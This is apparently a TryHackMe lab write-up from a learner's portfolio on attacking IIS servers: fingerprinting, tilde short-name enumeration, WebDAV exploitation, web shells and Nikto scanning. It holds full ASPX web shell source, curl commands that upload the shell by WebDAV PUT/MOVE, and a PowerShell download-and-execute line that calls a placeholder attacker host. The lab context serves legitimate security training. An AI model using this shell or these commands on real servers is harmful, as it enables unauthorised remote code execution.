# TryHackMe — Web Server Attacks II

![TryHackMe](https://img.shields.io/badge/Platform-TryHackMe-212C42?style=flat&logo=tryhackme&logoColor=white)
![Path](https://img.shields.io/badge/Path-Jr%20Penetration%20Tester-red)
![Topic](https://img.shields.io/badge/Topic-IIS%20%7C%20WebDAV%20%7C%20Web%20Shells-red)
![Status](https://img.shields.io/badge/Status-Completed-brightgreen)
![Date](https://img.shields.io/badge/Completed-July%202026-purple)

---

## Overview

| Field | Details |
|-------|---------|
| Room | Web Server Attacks - II |
| Path | Jr Penetration Tester → Web Application Security Fundamentals |
| Tasks | Task 1 — Task 8 (all, 100%) |

---

## Tasks Completed

| Task | Topic |
|------|-------|
| Task 1 | Introduction |
| Task 2 | IIS Fingerprinting and Enumeration |
| Task 3 | IIS Tilde (Short Filename) Enumeration |
| Task 4 | WebDAV Exploitation: Uploading an ASPX Shell |
| Task 5 | ASPX Web Shells |
| Task 6 | IIS Misconfigurations |
| Task 7 | Automation |
| Task 8 | Conclusion |

---

## Task 2 — IIS Fingerprinting and Enumeration

IIS (Internet Information Services) is Microsoft's web server — found on Windows servers in corporate environments, banks, and government systems. Particularly relevant to Pakistan's enterprise sector where Windows Server is common.

**Fingerprinting IIS:**
```bash
curl -I http://target.com

# IIS-specific headers:
Server: Microsoft-IIS/10.0
X-Powered-By: ASP.NET
X-AspNet-Version: 4.0.30319

# IIS version → Windows Server version mapping:
IIS 10.0 → Windows Server 2016/2019/2022
IIS 8.5  → Windows Server 2012 R2
IIS 7.5  → Windows Server 2008 R2
```

**Default IIS paths to check:**
```
/iisstart.htm          → Default IIS welcome page (confirms IIS)
/iis-85.png            → Default image on IIS 8.5
/_vti_bin/             → FrontPage Server Extensions
/aspnet_client/        → ASP.NET client scripts
```

---

## Task 3 — IIS Tilde (~) Short Filename Enumeration

A legacy Windows vulnerability — IIS exposes the 8.3 short filename format of files and directories through HTTP requests, allowing enumeration of filenames even when directory listing is disabled.

**How it works:**
```
Windows creates short names for files with long names:
"Administrator.aspx" → "ADMINI~1.ASPX"
"backup_2024.zip"    → "BACKUP~1.ZIP"

IIS responds differently to requests for these short names:
GET /ADMINI~1.ASPX   → 200 or 302 (file exists)
GET /RANDOM~1.ASPX   → 404 (file doesn't exist)

By brute-forcing the first 6 characters, full filenames can be reconstructed.
```

**Tool:**
```bash
# IIS short name scanner
python iis_shortname_scanner.py http://target.com/

# Tilde check — confirm vulnerability exists
curl "http://target.com/*~1*/.aspx" -I
# 404 = not vulnerable, 400 = potentially vulnerable
```

**Why this matters:** Reveals backup files, admin scripts, and other sensitive filenames that directory listing would otherwise hide.

---

## Task 4 — WebDAV Exploitation: Uploading an ASPX Shell

WebDAV (Web Distributed Authoring and Versioning) is an extension to HTTP that allows file management operations — PUT, DELETE, MOVE, COPY.

**Finding WebDAV:**
```bash
curl -X OPTIONS http://target.com/ -I
# Look for: DAV: 1,2 in response headers

nmap --script http-webdav-scan -p 80 target.com
```

**Uploading a shell via WebDAV PUT:**
```bash
# Upload an ASPX web shell
curl -X PUT http://target.com/shell.aspx \
  -d "<%@ Page Language='C#'%><%Response.Write(Request['cmd']);System.Diagnostics.Process.Start(Request['cmd']);%>"

# Or upload a file and move it to .aspx extension
curl -X PUT http://target.com/shell.txt --data-binary @shell.aspx
curl -X MOVE http://target.com/shell.txt \
  --header "Destination: http://target.com/shell.aspx"
```

---

## Task 5 — ASPX Web Shells

ASPX web shells run on IIS/ASP.NET servers and give remote code execution through a browser interface.

**Minimal ASPX shell:**
```aspx
<%@ Page Language="C#" %>
<%
  string cmd = Request.QueryString["cmd"];
  System.Diagnostics.ProcessStartInfo psi = 
    new System.Diagnostics.ProcessStartInfo("cmd.exe", "/c " + cmd);
  psi.RedirectStandardOutput = true;
  psi.UseShellExecute = false;
  System.Diagnostics.Process p = System.Diagnostics.Process.Start(psi);
  string output = p.StandardOutput.ReadToEnd();
  Response.Write("<pre>" + output + "</pre>");
%>
```

**Using the shell:**
```
http://target.com/shell.aspx?cmd=whoami
http://target.com/shell.aspx?cmd=ipconfig
http://target.com/shell.aspx?cmd=net user
http://target.com/shell.aspx?cmd=dir C:\
```

**Escalating to reverse shell from ASPX shell:**
```
?cmd=powershell -c "IEX(New-Object Net.WebClient).downloadString('http://ATTACKER/shell.ps1')"
```

---

## Task 6 — IIS Misconfigurations

| Misconfiguration | Test | Impact |
|-----------------|------|--------|
| **WebDAV enabled** | `OPTIONS /` → check for `DAV:` header | File upload → RCE |
| **Directory browsing** | Browse directories without default.aspx | File enumeration |
| **Anonymous authentication** | Access /admin without credentials | Unauthorised access |
| **Default documents still present** | `/iisstart.htm`, `/default.aspx` | Information disclosure |
| **HTTP TRACE enabled** | `TRACE / HTTP/1.1` → echoes request | XST (Cross-Site Tracing) |
| **Verbose error messages** | Trigger an error → check for stack traces | Path and version disclosure |
| **Double URL encoding bypass** | `%252e%252e/` instead of `../` | Path traversal |

---

## Task 7 — Automation

**Nikto — automated web server scanner:**
```bash
nikto -h http://target.com
nikto -h http://target.com -p 443 -ssl
```

Nikto automatically tests for:
- Dangerous HTTP methods (PUT, DELETE)
- Default files and directories
- Outdated software versions
- Common misconfigurations
- WebDAV presence

**Note:** Nikto is noisy — it generates significant log entries on the target. Use it after confirming the engagement allows active scanning.

---

## Key Takeaways

- **IIS is common in Pakistani enterprise environments** — banks, telecoms, and government systems run Windows Server; knowing IIS-specific attacks is directly relevant to local job market targets
- **Tilde enumeration reveals what directory listing hides** — a classic Windows/IIS quirk that remains exploitable on unpatched systems
- **WebDAV + PUT = file upload = RCE** — when WebDAV is enabled and PUT is allowed, uploading a web shell is trivial and leads directly to code execution
- **ASPX shells require IIS/.NET** — understanding the server technology determines which shell type to use (ASPX for IIS, PHP for Apache/Nginx)
- **Nikto is a starting point, not a conclusion** — automated scanners miss logic flaws and application-specific vulnerabilities; always follow up with manual testing

---

*Part of my 6-month cybersecurity portfolio — [github.com/shehrozmajeed](https://github.com/shehrozmajeed)*
